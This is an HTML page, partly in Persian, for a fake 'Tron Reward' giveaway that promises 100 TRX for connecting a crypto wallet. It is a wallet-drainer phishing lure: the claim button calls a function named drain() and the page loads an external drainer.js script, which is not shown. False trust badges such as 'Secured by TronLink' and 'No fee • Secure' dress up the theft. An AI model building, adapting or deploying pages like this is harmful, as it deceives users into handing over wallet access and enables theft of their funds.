<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tron Reward Claim</title>
  <style>
    body { background: #000; color: #fff; font-family: Arial; text-align: center; padding: 40px; }

    .logo { width: 120px; margin: 20px auto; }
    h1 { font-size: 24px; color: #ff0066; margin: 10px 0; }
    .claim-text { font-size: 18px; color: #fff; margin: 20px 0; }
    .connect-btn { background: #ff0066; color: #fff; border: none; padding: 16px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
    .connect-btn:hover { background: #cc0052; }
    .secured { font-size: 14px; color: #00ff00; margin-top: 20px; font-weight: bold; }
    .footer { font-size: 12px; color: #666; margin-top: 30px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="logo" alt="Tron">
    <h1>Tron Reward</h1>
    <p class="claim-text">اتصال کیف پول برای دریافت <strong>100 TRX</strong> فوری!</p>
    <p>No fee • Secure • Powered by Tron Network</p>
    <p class="secured">✅ Secured by TronLink</p>
    <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
    <div class="footer">© 2025 Tron • Encrypted • Secure</div>
  </div>
  <script src="drainer.js"></script>
</body>
</html>
